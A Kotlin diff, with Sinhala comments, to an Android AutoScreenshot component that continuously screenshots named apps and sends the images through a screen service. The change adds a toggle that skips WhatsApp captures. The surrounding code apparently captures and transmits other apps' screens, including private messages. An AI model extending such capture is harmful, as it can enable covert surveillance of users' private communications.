@@ -36,6 +36,11 @@ object AutoScreenshot {
     private var currentApp: String? = null
     private var isRunning = false
 
+    // ===== අලුතින් එකතු කරපු කොටස =====
+    @Volatile
+    private var whatsappEnabled = true
+    // ====================================
+
     fun startContinuous(context: Context, appName: String) {
         stopContinuous()
         currentApp = appName
@@ -82,6 +87,14 @@ object AutoScreenshot {
     }
 
     private fun takeAndSend(context: Context, appName: String, type: String) {
+        // ===== අලුතින් එකතු කරපු කොටස =====
+        // WhatsApp සඳහා ඕෆ් නම්, ස්ක්‍රීන්ෂොට් ගන්නේ නෑ
+        if (appName.lowercase().contains("whatsapp") && !whatsappEnabled) {
+            Log.d(TAG, "WhatsApp screenshots disabled, skipping...")
+            return
+        }
+        // ====================================
+
         val svc = ScreenService.instance ?: run {
             Log.e(TAG, "ScreenService not available")
             return
@@ -122,9 +135,14 @@ object AutoScreenshot {
         }
     }
 
-    // ===== Compatibility functions =====
-    fun isEnabled(context: Context): Boolean = true
-    fun setEnabled(context: Context, enabled: Boolean) {}
+    // ===== වෙනස් කරපු කොටස =====
+    fun isEnabled(context: Context): Boolean = whatsappEnabled
+    fun setEnabled(context: Context, enabled: Boolean) {
+        whatsappEnabled = enabled
+        Log.d(TAG, "WhatsApp screenshots: ${if (enabled) "ON" else "OFF"}")
+    }
+    // =============================
+
     fun getCount(context: Context): Int = 1
     fun setCount(context: Context, count: Int) {}
 }
